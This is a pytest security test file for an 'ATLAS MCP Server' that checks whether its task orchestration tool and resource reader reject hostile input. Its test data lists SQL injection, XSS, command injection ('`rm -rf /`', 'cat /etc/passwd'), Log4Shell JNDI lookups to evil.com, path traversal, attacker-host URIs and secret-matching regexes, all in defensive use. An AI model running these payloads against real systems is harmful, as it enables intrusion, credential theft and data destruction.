"""
Security tests for ATLAS MCP Server - Security validation and penetration testing
Testing input validation, injection attacks, access control, and security compliance.
"""

import pytest
import json
import re
import hashlib
import base64
from typing import Dict, Any, List
from unittest.mock import patch, Mock

from src.atlas_commands.server import EnhancedAtlasCommandsServer
from src.atlas_commands.tools.orchestrate_intelligent_tasks import orchestrate_intelligent_tasks
from src.atlas_commands.task_analysis_algorithm import analyze_task_for_atlas_framework


class TestInputValidationSecurity:
    """Test input validation and sanitization security."""
    
    @pytest.fixture
    def mcp_server(self):
        """Create MCP server for security testing."""
        return EnhancedAtlasCommandsServer()
    
    def test_injection_attack_prevention(self):
        """Test prevention of various injection attacks."""
        
        injection_payloads = [
            # SQL Injection attempts
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1; SELECT * FROM users WHERE 't' = 't",
            "admin'--",
            "' UNION SELECT password FROM users--",
            
            # Script injection attempts
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "${alert('XSS')}",
            "{{constructor.constructor('alert(1)')()}}",
            
            # Command injection attempts
            "; ls -la",
            "&& cat /etc/passwd",
            "| whoami",
            "`rm -rf /`",
            "$(whoami)",
            
            # LDAP injection attempts
            "${jndi:ldap://evil.com/a}",
            "${jndi:dns://evil.com/a}",
            
            # Path traversal attempts
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            
            # JSON injection attempts
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
        ]
        
        for payload in injection_payloads:
            try:
                # Test injection in task description
                result = orchestrate_intelligent_tasks(
                    task_description=payload,
                    context={"domain": "security_test"},
                    requirements={}
                )
                
                # Verify payload is not executed/reflected unsanitized
                if isinstance(result, dict):
                    result_str = json.dumps(result).lower()
                    
                    # Check for dangerous patterns in response
                    dangerous_patterns = [
                        'drop table', 'select *', '/etc/passwd', 'whoami',
                        '<script>', 'javascript:', 'alert(', '${jndi:',
                        '__proto__', 'constructor'
                    ]
                    
                    for pattern in dangerous_patterns:
                        assert pattern not in result_str, f"Dangerous pattern '{pattern}' found in response for payload: {payload}"
                        
                    # Ensure the payload itself isn't echoed back unescaped
                    assert payload.lower() not in result_str, f"Payload echoed back unescaped: {payload}"
                    
            except (ValueError, TypeError, AttributeError) as e:
                # Rejection of malicious input is acceptable
                assert len(str(e)) > 0  # Should have meaningful error message
                continue
            except Exception as e:
                # Unexpected errors might indicate security issues
                error_msg = str(e).lower()
                assert not any(word in error_msg for word in ['syntax error', 'sql', 'command not found'])
    
    def test_oversized_input_handling(self):
        """Test handling of oversized inputs (DoS prevention)."""
        
        oversized_inputs = [
            # Very long strings
            "A" * 10000,
            "B" * 100000,
            "C" * 1000000,
            
            # Deeply nested structures in context
            {"level_" + str(i): f"data_{i}" for i in range(10000)},
            
            # Large arrays
            [f"item_{i}" for i in range(50000)],
            
            # Very long task descriptions
            "Implement " + "very complex " * 1000 + "system",
        ]
        
        for oversized_input in oversized_inputs:
            try:
                if isinstance(oversized_input, str):
                    result = orchestrate_intelligent_tasks(
                        task_description=oversized_input,
                        context={"domain": "size_test"},
                        requirements={}
                    )
                elif isinstance(oversized_input, (dict, list)):
                    result = orchestrate_intelligent_tasks(
                        task_description="Test with large context",
                        context={"domain": "size_test", "large_data": oversized_input},
                        requirements={}
                    )
                
                # If processing succeeds, verify reasonable response size
                if result:
                    result_size = len(json.dumps(result))
                    assert result_size < 10 * 1024 * 1024, f"Response too large: {result_size} bytes"
                    
            except (ValueError, MemoryError, OSError) as e:
                # Rejection of oversized input is acceptable
                assert "size" in str(e).lower() or "memory" in str(e).lower() or "limit" in str(e).lower()
            except Exception as e:
                # Should not cause unexpected crashes
                assert str(e) != "", "Empty error message indicates potential security issue"
    
    def test_unicode_security_handling(self):
        """Test security handling of Unicode and encoding attacks."""
        
        unicode_attacks = [
            # Unicode normalization attacks
            "admin\u200d",  # Zero-width joiner
            "admin\u200c",  # Zero-width non-joiner
            "admin\u202e",  # Right-to-left override
            
            # Unicode encoding bypasses
            "%41%44%4d%49%4e",  # URL encoded "ADMIN"
            "\u0041\u0044\u004d\u0049\u004e",  # Unicode encoded "ADMIN"
            
            # Overlong UTF-8 sequences
            "\xc0\xae",  # Overlong encoding of '.'
            "\xc0\xaf",  # Overlong encoding of '/'
            
            # Unicode spoofing
            "аdmin",  # Cyrillic 'а' instead of latin 'a'
            "admin‌",  # With zero-width non-joiner
            
            # BIDI attacks
            "admin\u202eROTARTSINIMDA",
            
            # Emoji and special Unicode
            "😈💀☠️🤮",
            "🚀💻🔐",
        ]
        
        for unicode_payload in unicode_attacks:
            try:
                result = orchestrate_intelligent_tasks(
                    task_description=f"Process Unicode test: {unicode_payload}",
                    context={"domain": "unicode_security", "payload": unicode_payload},
                    requirements={}
                )
                
                # Verify Unicode is handled safely
                if result:
                    # Should be JSON serializable
                    json_result = json.dumps(result, ensure_ascii=False)
                    assert isinstance(json_result, str)
                    
                    # Should not contain potentially dangerous Unicode
                    dangerous_unicode = ["\u202e", "\u200d", "\u200c"]
                    for dangerous_char in dangerous_unicode:
                        assert dangerous_char not in json_result
                        
            except (UnicodeError, ValueError) as e:
                # Unicode rejection is acceptable
                assert "unicode" in str(e).lower() or "encoding" in str(e).lower()


class TestAccessControlSecurity:
    """Test access control and authorization security."""
    
    @pytest.fixture
    def secure_server(self):
        """Create server with security context."""
        server = EnhancedAtlasCommandsServer()
        # Add security context
        server.security_context = {
            'user_id': 'test_user',
            'permissions': ['read', 'execute'],
            'session_id': 'test_session_123'
        }
        return server
    
    def test_unauthorized_resource_access(self, secure_server):
        """Test prevention of unauthorized resource access."""
        
        unauthorized_uris = [
            # System file attempts
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///proc/version",
            "file:///sys/class/net",
            
            # Windows system files
            "file:///C:/Windows/System32/config/SAM",
            "file:///C:/Windows/System32/drivers/etc/hosts",
            
            # Path traversal in custom schemes
            "atlas://../../etc/passwd",
            "atlas://../../../secret/keys",
            
            # Network locations
            "http://evil.com/malicious",
            "ftp://attacker.com/payload",
            "smb://malicious.server/share",
            
            # Local network attempts
            "http://127.0.0.1:22/",
            "http://localhost:3306/",
            "http://192.168.1.1/admin",
        ]
        
        for uri in unauthorized_uris:
            with pytest.raises(Exception) as exc_info:
                # This should raise an exception for unauthorized access
                secure_server.read_resource_sync(uri)
            
            # Verify meaningful security error
            error_msg = str(exc_info.value).lower()
            security_keywords = ['unauthorized', 'forbidden', 'access denied', 'permission', 'security']
            assert any(keyword in error_msg for keyword in security_keywords), f"Non-security error for URI: {uri}"
    
    def test_privilege_escalation_prevention(self, secure_server):
        """Test prevention of privilege escalation attempts."""
        
        escalation_attempts = [
            # Admin operation attempts
            {
                'name': 'admin_orchestrate_tasks',
                'arguments': {'admin_override': True, 'escalate_privileges': True}
            },
            
            # System command attempts
            {
                'name': 'orchestrate_intelligent_tasks',
                'arguments': {
                    'task_description': 'Execute system commands with elevated privileges',
                    'context': {'domain': 'system', 'privilege_level': 'admin'},
                    'requirements': {'system_access': 'root', 'sudo': True}
                }
            },
            
            # Configuration override attempts
            {
                'name': 'orchestrate_intelligent_tasks',
                'arguments': {
                    'task_description': 'Override security configuration',
                    'context': {'security_override': True, 'bypass_auth': True},
                    'requirements': {'admin_mode': True}
                }
            },
        ]
        
        for attempt in escalation_attempts:
            try:
                # Should either reject or handle safely
                result = secure_server.call_tool_sync(attempt)
                
                if result:
                    # If processed, should not grant elevated privileges
                    result_str = json.dumps(result).lower()
                    dangerous_indicators = [
                        'admin', 'root', 'sudo', 'privilege', 'escalate',
                        'system_command', 'override', 'bypass'
                    ]
                    
                    # Should not indicate successful privilege escalation
                    for indicator in dangerous_indicators:
                        if indicator in result_str:
                            assert 'denied' in result_str or 'unauthorized' in result_str
                            
            except Exception as e:
                # Rejection is acceptable and preferred
                error_msg = str(e).lower()
                assert any(word in error_msg for word in ['permission', 'unauthorized', 'forbidden'])


class TestDataSecurityAndPrivacy:
    """Test data security and privacy protection."""
    
    def test_sensitive_data_exposure_prevention(self):
        """Test prevention of sensitive data exposure."""
        
        sensitive_contexts = [
            # PII data
            {
                'domain': 'user_management',
                'user_data': {
                    'ssn': '123-45-6789',
                    'credit_card': '4111-1111-1111-1111',
                    'phone': '+1-555-123-4567',
                    'email': 'user@example.com'
                }
            },
            
            # Authentication data
            {
                'domain': 'authentication',
                'credentials': {
                    'password': 'super_secret_password',
                    'api_key': 'sk-1234567890abcdef',
                    'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
                    'secret': 'my_secret_key_123'
                }
            },
            
            # System configuration
            {
                'domain': 'system_config',
                'config': {
                    'database_url': 'postgresql://user:pass@host:5432/db',
                    'redis_url': 'redis://user:pass@host:6379',
                    'smtp_password': 'email_password_123'
                }
            },
        ]
        
        for sensitive_context in sensitive_contexts:
            result = orchestrate_intelligent_tasks(
                task_description="Process sensitive data safely",
                context=sensitive_context,
                requirements={'data_privacy': 'strict'}
            )
            
            if result:
                result_str = json.dumps(result)
                
                # Check for sensitive data patterns
                sensitive_patterns = [
                    r'\d{3}-\d{2}-\d{4}',  # SSN pattern
                    r'\d{4}-\d{4}-\d{4}-\d{4}',  # Credit card pattern
                    r'password["\s]*[:=]["\s]*[^"\s,}]+',  # Password in JSON
                    r'secret["\s]*[:=]["\s]*[^"\s,}]+',  # Secret in JSON
                    r'key["\s]*[:=]["\s]*[^"\s,}]+',  # Key in JSON
                    r'postgresql://[^:]+:[^@]+@',  # Database URL with credentials
                ]
                
                for pattern in sensitive_patterns:
                    matches = re.findall(pattern, result_str, re.IGNORECASE)
                    if matches:
                        # If sensitive data is found, it should be redacted/masked
                        for match in matches:
                            assert '*' in match or 'REDACTED' in match.upper() or len(match) < 4
    
    def test_data_sanitization_compliance(self):
        """Test data sanitization for compliance requirements."""
        
        compliance_scenarios = [
            # GDPR compliance
            {
                'task_description': 'Process EU user data according to GDPR',
                'context': {
                    'domain': 'gdpr_compliance',
                    'user_consent': True,
                    'data_retention': '30_days',
                    'user_location': 'EU'
                },
                'requirements': {'gdpr_compliant': True, 'data_minimization': True}
            },
            
            # HIPAA compliance
            {
                'task_description': 'Handle healthcare data with HIPAA compliance',
                'context': {
                    'domain': 'healthcare',
                    'phi_present': True,
                    'encryption_required': True
                },
                'requirements': {'hipaa_compliant': True, 'audit_trail': True}
            },
            
            # PCI DSS compliance
            {
                'task_description': 'Process payment data with PCI compliance',
                'context': {
                    'domain': 'payment_processing',
                    'card_data_present': True,
                    'pci_level': '1'
                },
                'requirements': {'pci_compliant': True, 'tokenization': True}
            },
        ]
        
        for scenario in compliance_scenarios:
            result = orchestrate_intelligent_tasks(**scenario)
            
            if result:
                # Verify compliance indicators
                result_str = json.dumps(result).lower()
                
                compliance_type = scenario['context']['domain']
                if 'gdpr' in compliance_type:
                    # Should mention data protection measures
                    assert any(term in result_str for term in ['privacy', 'consent', 'protection', 'anonymize'])
                elif 'healthcare' in compliance_type:
                    # Should mention healthcare security measures
                    assert any(term in result_str for term in ['encryption', 'audit', 'secure', 'protected'])
                elif 'payment' in compliance_type:
                    # Should mention payment security measures
                    assert any(term in result_str for term in ['secure', 'encrypt', 'token', 'vault'])


class TestSecurityAuditingAndLogging:
    """Test security auditing and logging capabilities."""
    
    def test_security_event_logging(self):
        """Test logging of security-relevant events."""
        
        security_events = [
            # Failed authentication attempts
            {
                'event_type': 'auth_failure',
                'task_description': 'Attempt to access restricted resource',
                'context': {'auth_token': 'invalid_token', 'user': 'unknown'}
            },
            
            # Suspicious input patterns
            {
                'event_type': 'suspicious_input',
                'task_description': '<script>alert("test")</script>',
                'context': {'source_ip': '192.168.1.100'}
            },
            
            # Rate limiting triggers
            {
                'event_type': 'rate_limit',
                'task_description': 'Rapid fire requests',
                'context': {'request_count': 1000, 'time_window': '1_minute'}
            },
        ]
        
        logged_events = []
        
        # Mock logging to capture security events
        def mock_security_log(event_type: str, details: Dict[str, Any]):
            logged_events.append({
                'type': event_type,
                'details': details,
                'timestamp': time.time()
            })
        
        with patch('src.atlas_commands.security.security_logger.log_event', side_effect=mock_security_log):
            for event in security_events:
                try:
                    orchestrate_intelligent_tasks(
                        task_description=event['task_description'],
                        context=event['context'],
                        requirements={}
                    )
                except Exception:
                    # Failures are expected for security events
                    pass
        
        # Verify security events were logged (if logging is implemented)
        # This is a placeholder - actual implementation depends on logging framework
        print(f"Security events captured: {len(logged_events)}")
    
    def test_audit_trail_integrity(self):
        """Test audit trail integrity and tamper resistance."""
        
        audit_operations = [
            "Create user account",
            "Modify permissions", 
            "Access sensitive data",
            "Delete records",
            "Export data"
        ]
        
        audit_entries = []
        
        def mock_audit_log(operation: str, user: str, timestamp: float, checksum: str):
            audit_entries.append({
                'operation': operation,
                'user': user,
                'timestamp': timestamp,
                'checksum': checksum
            })
        
        with patch('src.atlas_commands.security.audit_logger.log_operation', side_effect=mock_audit_log):
            for operation in audit_operations:
                try:
                    # Generate checksum for integrity
                    operation_data = f"{operation}|test_user|{time.time()}"
                    checksum = hashlib.sha256(operation_data.encode()).hexdigest()
                    
                    mock_audit_log(operation, "test_user", time.time(), checksum)
                    
                    # Simulate the actual operation
                    result = orchestrate_intelligent_tasks(
                        task_description=f"Audit test: {operation}",
                        context={'audit_required': True, 'user': 'test_user'},
                        requirements={'audit_trail': True}
                    )
                    
                except Exception:
                    # Some operations may fail, but should still be audited
                    pass
        
        # Verify audit trail integrity
        if audit_entries:
            for entry in audit_entries:
                assert 'operation' in entry
                assert 'user' in entry
                assert 'timestamp' in entry
                assert 'checksum' in entry
                assert len(entry['checksum']) == 64  # SHA256 length
                
        print(f"Audit entries created: {len(audit_entries)}")


import time  # Add missing import

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])